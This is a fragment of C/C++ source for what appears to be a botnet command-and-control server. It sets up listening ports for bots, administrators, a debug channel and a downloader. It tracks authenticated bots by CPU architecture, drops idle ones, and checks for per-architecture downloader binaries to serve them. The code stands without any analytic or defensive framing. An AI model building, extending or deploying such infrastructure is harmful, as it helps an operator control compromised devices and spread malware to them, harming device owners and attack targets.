
static void *client_timeout(void *arg)
{
    while(TRUE)
    {
	    int i = 0;

        for(i = 0; i < MAX_EVENTS; i++)
        {
            if(!client_list[i].connected || !client_list[i].authenticated)
                continue;
            if(client_list[i].timeout + TIMEOUT < time(NULL))
            {
                //printf("%s timed out (%d.%d.%d.%d)\n", client_list[i].arch, client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                
                terminate_client(client_list[i].fd);
                continue;
            }
        }

        sleep(1);
    }
}

static void client_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!client_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLIENT_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(client_fd);
    REUSE_ADDR(client_fd);

    ret = bind(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the client port", 1);
    }

    ret = listen(client_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the client port", 1);
    }

    return;
}

static void epoll_handler(void)
{
    struct epoll_event client_event;
    struct epoll_event admin_event;
    struct epoll_event downloader_event;
    struct epoll_event debug_event;

    int ret = -1;
    struct epoll_event *es;
    int x = 0;
    pthread_t client_timeout_thread;

    //cout << "Started the epoll handler..." << endl;

    efd = epoll_create1(0);
    if(efd == -1)
    {
        _exit("Failed to create the epoll fd", 1);
    }

    //cout << "Created the epoll fd!" << endl;

    client_event.data.fd = client_fd;
    // Edge-triggered events
    client_event.events = EPOLLIN | EPOLLET;

    //
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, client_fd, &client_event);
    if(ret == -1)
    {
        _exit("Failed to add the fd to epoll", 1);
    }

    admin_event.data.fd = admin_fd;
    // Edge-triggered events
    admin_event.events = EPOLLIN | EPOLLET;

    //
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, admin_fd, &admin_event);
    if(ret == -1)
    {
        _exit("Failed to add the fd to epoll", 1);
    }

    downloader_event.data.fd = downloader_fd;
    // Edge-triggered events
    downloader_event.events = EPOLLIN | EPOLLET;

    //
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, downloader_fd, &downloader_event);
    if(ret == -1)
    {
        _exit("Failed to add the fd to epoll", 1);
    }

    debug_event.data.fd = debug_fd;
    // Edge-triggered events
    debug_event.events = EPOLLIN | EPOLLET;

    //
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, debug_fd, &debug_event);
    if(ret == -1)
    {
        _exit("Failed to add the fd to epoll", 1);
    }

    //cout << "Added the fds to epoll!" << endl;

    // Allocate memory for the client list
    client_list = (struct clients *)calloc(MAX_EVENTS, sizeof(struct clients));
    if(!client_list)
    {
        _exit("Failed to allocate memory for the client list", 1);;
    }

    for(x = 0; x < MAX_EVENTS; x++)
    {
        client_list[x].fd = -1;
        client_list[x].connected = FALSE;
        client_list[x].addr = 0;
        client_list[x].authenticated = FALSE;
        client_list[x].timeout = 0;
        client_list[x].arch_len = 0;
        memset(client_list[x].arch, 0, sizeof(client_list[x].arch));
    }

    es = (struct epoll_event *)calloc(MAX_EVENTS, sizeof(struct epoll_event));
    if(!es)
    {
        _exit("Failed to allocate memory for the epoll events", 1);
    }

    //cout << "Allocated memory!" << endl;

    // Spawn the timeout thread
    pthread_create(&client_timeout_thread, NULL, client_timeout, NULL);

    // Start the main event loop
    while(TRUE)
    {
        int n = 0;
        int i = 0;
        int cfd = -1;

        n = epoll_wait(efd, es, MAX_EVENTS, -1);
        if(n == -1)
        {
            std::cout << "Epoll error" << std::endl;
            break;
        }

        for(i = 0; i < n; i++)
            process_event(&es[i], efd);
    }

    free(es);
    free(client_list);
    close(efd);
    _exit("Epoll finished", 1);
}

static void check_downloaders()
{
    std::map<std::string, std::string>::iterator downloader_iterator;

    for(downloader_iterator = downloader_arch.begin(); downloader_iterator != downloader_arch.end(); downloader_iterator++)
    {
        std::stringstream dlr_stream;

        dlr_stream << DOWNLOADER_PREFIX << downloader_iterator->first;
        
        if (access(dlr_stream.str().c_str(), F_OK) == -1)
        {
            std::cout << "Failed to open " << dlr_stream.str() << std::endl;
        }
    }
}

int main(void)
{
    std::cout << "Admin port: " << ADMIN_PORT << std::endl;
    std::cout << "Client port: " << CLIENT_PORT << std::endl;
    std::cout << "Debug port:" << DEBUG_PORT << std::endl;
    std::cout << "Downloader port: " << DOWNLOADER_PORT << std::endl;

    mysql_clear_login();

    debug_bind();

    check_downloaders();

    downloader_bind();

    client_bind();

    admin_bind();

    epoll_handler();

    return 0;
}
